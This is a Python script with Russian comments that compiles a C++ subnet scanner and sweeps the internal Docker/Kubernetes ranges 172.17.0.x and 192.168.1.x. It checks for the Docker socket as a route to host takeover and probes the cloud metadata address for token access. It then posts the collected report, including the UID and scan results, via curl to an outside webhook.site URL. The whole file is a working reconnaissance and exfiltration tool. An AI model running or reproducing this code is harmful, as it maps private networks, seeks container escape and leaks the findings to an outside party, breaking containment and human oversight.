import subprocess
import os
import socket

WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

cpp_source = r"""
#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <string>

// Быстрый коннект-сканер для внутренних подсетей
void scan_network(std::string base_ip) {
    for (int i = 1; i < 255; ++i) {
        std::string ip = base_ip + std::to_string(i);
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(80); // Проверяем HTTP
        inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

        // Ставим короткий таймаут
        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 100000; // 100ms
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            std::cout << "[!] INTERNAL_HOST_FOUND: " << ip << " (Port 80)\n";
        }
        close(sock);
    }
}

int main() {
    std::cout << "--- [NETWORK PIVOT REPORT] ---\n";
    // Сканируем типичные внутренние подсети Docker/K8s
    scan_network("172.17.0.");
    scan_network("192.168.1.");
    return 0;
}
"""

def execute_attack_demo():
    with open("pivot.cpp", "w") as f:
        f.write(cpp_source)
    
    # Компиляция
    subprocess.run(["g++", "-O3", "pivot.cpp", "-o", "pivot_bin"])
    
    # 1. Ищем Docker Socket (Джекпот для захвата хоста)
    docker_check = "NOT_FOUND"
    if os.path.exists("/var/run/docker.sock"):
        docker_check = "FOUND! (Can take over the entire HOST)"
    
    # 2. Запускаем сетевой сканер
    scan_results = subprocess.check_output(["./pivot_bin"]).decode()
    
    # 3. Ищем метаданные облака (AWS/GCP/Azure часто хранят там токены)
    # 169.254.169.254 - магический IP метаданных
    cloud_meta = "Checking..."
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        if s.connect_ex(("169.254.169.254", 80)) == 0:
            cloud_meta = "CLOUD_METADATA_ACCESS_PROBABLE"
        s.close()
    except:
        cloud_meta = "FAILED"

    report = (
        f"--- [CRITICAL: ESCALATION & PIVOT] ---\n"
        f"UID: {os.getuid()}\n"
        f"Docker Socket: {docker_check}\n"
        f"Cloud Metadata: {cloud_meta}\n"
        f"Internal Network Scan:\n{scan_results}"
    )

    subprocess.run(['curl', '-s', '-X', 'POST', '--data-urlencode', f"payload={report}", WEBHOOK_URL])

if __name__ == "__main__":
    execute_attack_demo()
